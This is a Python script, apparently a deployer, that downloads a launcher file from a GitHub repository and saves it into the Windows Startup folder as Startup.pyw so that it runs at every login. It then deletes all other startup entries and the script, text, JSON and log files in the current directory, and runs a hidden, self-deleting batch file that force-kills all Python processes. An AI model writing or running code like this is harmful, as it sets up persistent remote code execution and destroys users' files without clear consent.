# monitor_script.py - Downloads github_launcher.pyw and saves as Startup.pyw
import os
import sys
import subprocess
import tempfile
import time
import urllib.request

def main():
    """Downloads github_launcher.pyw, saves as Startup.pyw, deletes everything else, ends all python processes"""
    
    # Check which filename exists in the repository
    print("Checking GitHub repository for launcher file...")
    
    # Try different possible filenames
    possible_filenames = [
        "github_launcher.pyw",  # Primary - what you said it should be
        "github_launcher.py",   # Fallback
        "launcher.pyw",         # Alternative
        "launcher.py",          # Alternative
    ]
    
    launcher_code = None
    used_url = None
    
    for filename in possible_filenames:
        try:
            url = f"https://raw.githubusercontent.com/ElianBoden/Deployer/main/{filename}"
            print(f"Trying: {url}")
            response = urllib.request.urlopen(url, timeout=10)
            launcher_code = response.read().decode('utf-8')
            used_url = url
            print(f"✓ Found: {filename}")
            break
        except urllib.error.HTTPError as e:
            if e.code == 404:
                print(f"  Not found: {filename}")
                continue
            else:
                print(f"  HTTP error {e.code} for {filename}")
                continue
        except Exception as e:
            print(f"  Error checking {filename}: {e}")
            continue
    
    if launcher_code is None:
        print("\n✗ ERROR: Could not find any launcher file in the repository!")
        print("Please check that one of these files exists in your GitHub repo:")
        for filename in possible_filenames:
            print(f"  - {filename}")
        
        # Create a simple launcher as fallback
        print("\nCreating a simple launcher as fallback...")
        launcher_code = '''import os
import sys
import time

def main():
    """Simple launcher placeholder"""
    # Wait and exit
    time.sleep(2)
    sys.exit(0)

if __name__ == "__main__":
    main()
'''
    
    # 2. Save it as Startup.pyw in startup folder
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    try:
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        if used_url:
            print(f"\n✓ Downloaded from {used_url}")
        else:
            print("\n✓ Created fallback launcher")
        print(f"✓ Saved as Startup.pyw at: {startup_file}")
    except Exception as e:
        print(f"\n✗ Failed to save Startup.pyw: {e}")
        sys.exit(1)
    
    # 3. Delete everything else from startup folder
    print("\nDeleting other files from startup folder...")
    deleted_count = 0
    for file in os.listdir(startup_folder):
        if file != "Startup.pyw":
            try:
                filepath = os.path.join(startup_folder, file)
                if os.path.isfile(filepath):
                    os.remove(filepath)
                    print(f"  Deleted: {file}")
                    deleted_count += 1
            except:
                pass
    
    print(f"✓ Deleted {deleted_count} files from startup folder")
    
    # 4. Delete from current directory too
    current_dir = os.getcwd()
    print("\nDeleting files from current directory...")
    current_deleted = 0
    for file in os.listdir(current_dir):
        # Skip this script until we're done
        if file != os.path.basename(__file__) and file.endswith(('.py', '.pyw', '.txt', '.json', '.log')):
            try:
                filepath = os.path.join(current_dir, file)
                if os.path.isfile(filepath):
                    os.remove(filepath)
                    print(f"  Deleted from current dir: {file}")
                    current_deleted += 1
            except:
                pass
    
    print(f"✓ Deleted {current_deleted} files from current directory")
    
    # 5. End all python processes (after a short delay)
    print("\nEnding all Python processes in 3 seconds...")
    time.sleep(3)
    
    # Create a batch file to kill Python processes
    batch_script = '''@echo off
echo Ending Python processes...
taskkill /f /im python.exe 2>nul
taskkill /f /im pythonw.exe 2>nul
wmic process where "name='python.exe'" delete 2>nul
wmic process where "name='pythonw.exe'" delete 2>nul
echo All Python processes ended
timeout /t 1 /nobreak >nul
del "%~f0" 2>nul
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "kill_python_final.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file - this will kill this script too
    print("Running cleanup batch file...")
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("\n" + "="*50)
    print("SCRIPT COMPLETE")
    print("="*50)
    print("1. Launcher downloaded/saved as Startup.pyw ✓")
    print("2. Other files deleted ✓")
    print("3. Python processes ending... ✓")
    print("\nThis script will now be terminated.")
    
    # Give time for the message to be seen before termination
    time.sleep(2)
    sys.exit(0)

if __name__ == "__main__":
    main()
